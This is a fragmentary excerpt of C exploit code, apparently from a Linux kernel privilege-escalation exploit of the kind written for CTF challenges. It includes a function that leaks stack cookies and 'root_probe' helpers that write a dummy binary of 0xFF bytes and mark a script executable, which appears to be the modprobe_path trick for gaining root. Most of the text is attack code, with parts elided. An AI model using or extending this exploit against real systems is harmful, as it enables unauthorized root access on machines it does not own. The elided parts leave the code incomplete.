...
void test(){
    puts(COLOR_YELLOW "[+] Run normally !" COLOR_RESET);
}
...
uint64_t* leak_cookie(uint32_t fd, uint64_t size) {
    uint8_t sz = size / 8 ;
    uint64_t leak[sz];
...
void set_root_probe(){
    ...
    system("chmod +x /home/user/y");
}

void get_root_probe(void){
    system("echo -e '\xFF\xFF\xFF\xFF' > /home/user/x" );
